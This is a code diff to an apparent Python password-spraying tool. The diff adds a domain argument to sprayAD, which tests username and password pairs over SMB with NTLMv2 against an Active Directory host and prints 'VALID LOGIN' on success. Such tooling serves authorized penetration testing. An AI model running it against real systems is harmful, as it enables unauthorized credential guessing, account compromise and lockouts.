@@ -36,6 +36,8 @@ def switch():
         '-s', '--servername', help='the computername or servername of the remote machine', required=False)
     parser.add_argument(
         '-c', '--client', help='the computername of the client machine', required=False)
+    parser.add_argument(
+        '-d', '--domain', help='the domain name of the remote machine in the AD', required=False)
     
     return parser.parse_args()
 
@@ -197,7 +199,7 @@ def hybrid_office_worker(policy, user, _pass):
     else:
         print(Fore.RED +"[!]Unknown input. Check the usage")
 
-def sprayAD(host,username,password,client,computerName=""):
+def sprayAD(host,username,password,client,computerName="",domain=""):
     if verbose:
         print(Fore.YELLOW +
               "Checking credentials {0}:{1}".format(username, password))
@@ -205,7 +207,7 @@ def sprayAD(host,username,password,client,computerName=""):
     if not computerName:
         computerName = getServerName(IP)
 
-    conn = SMBConnection(username,password,client,computerName,use_ntlm_v2 = True,is_direct_tcp=True)
+    conn = SMBConnection(username,password,client,computerName,domain,use_ntlm_v2 = True,is_direct_tcp=True)
     if conn.connect(IP,int(port)):
         print(Fore.GREEN+"VALID LOGIN on {}:{} using {}:{}".format(IP,port,username,password))
     else:
@@ -290,6 +292,7 @@ if __name__ == '__main__':
     host = options.host
     servername = options.servername
     client = options.client
+    domain = options.domain
 
     #Perform checks to make sure options are correct
     if username and userfile:
@@ -336,11 +339,13 @@ if __name__ == '__main__':
             servername = ""
         if not client:
             client = "Marketing"
+        if not domain:
+            domain = ""
         if not host:
             ArgumentParser().print_help()
             sys.exit(0)
         if single_test:
-            sprayAD(host, username, password, client, servername)
+            sprayAD(host, username, password, client, servername, domain)
         else:
             if not policy:
                 ArgumentParser().print_help()
